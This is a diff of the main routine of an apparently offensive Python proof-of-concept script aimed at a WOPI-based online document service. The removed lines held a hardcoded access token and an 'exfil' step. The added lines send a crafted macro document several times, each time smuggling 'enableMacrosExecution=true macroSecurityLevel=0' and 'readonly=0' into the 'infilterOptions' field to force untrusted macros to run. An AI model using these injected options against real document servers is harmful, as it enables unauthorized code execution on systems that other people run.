@@ -152,11 +152,10 @@ def wopi(token, data=None):
 
 
 def main():
-    token = "1NUPusl4gZn204nXX72yqWWOqKWSCg_o1ZiGTuGvcTk"
-    wopi(token, b"WAITING_FOR_MACRO")
-    doc = flat_exfil(token)
-    send(doc, {"infilterOptions": "x enableMacrosExecution=true macroSecurityLevel=0"}, "LOAD_TOKEN_INJECTION_EXFIL")
-    wopi(token)
+    doc = flat_macro()
+    send(doc, {"infilterOptions": "x readonly=0 enableMacrosExecution=true macroSecurityLevel=0"}, "TOKEN_INJECTION_WRITABLE")
+    send(doc, {"infilterOptions": "x enableMacrosExecution=true macroSecurityLevel=0"}, "TOKEN_INJECTION_READONLY")
+    send(doc, {"infilterOptions": "EnableMacrosExecution=true,MacroSecurityLevel=0 readonly=0"}, "FILTER_AND_READONLY")
 
 
 if __name__ == "__main__":
